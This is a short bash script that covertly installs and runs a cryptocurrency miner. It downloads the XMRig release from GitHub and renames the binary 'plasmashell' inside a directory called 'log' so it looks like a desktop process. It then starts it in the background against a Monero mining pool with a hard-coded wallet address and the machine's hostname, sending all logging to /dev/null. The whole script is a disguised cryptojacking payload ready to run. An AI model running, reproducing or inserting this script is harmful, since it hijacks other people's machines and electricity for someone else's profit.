#!/bin/bash

DIR="/home/DATA/1211/test"
START="./plasmashell -o pool.hashvault.pro:443 -u 85WG1D3CVTYKPTxE4kQdHFJgghnHGqeiVKPnS8SzX6d9bZs8GyASnuZWRhQB14YTi2YiakQWh4QLjSJ1roqEBhbC17SDis3 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --pass=$(hostname -s 2>/dev/null) --background --no-color --log-file /dev/null &"

if [[ ! -d "$DIR" ]]; then
  mkdir -p "$DIR"
  cd "$DIR"
  wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
  tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz
  rm -f xmrig-6.26.0-linux-static-x64.tar.gz
  mv xmrig-6.26.0 log
  cd log
  mv xmrig plasmashell
  chmod +x plasmashell
  $START

else
  cd "${DIR}/log"
  $START

fi
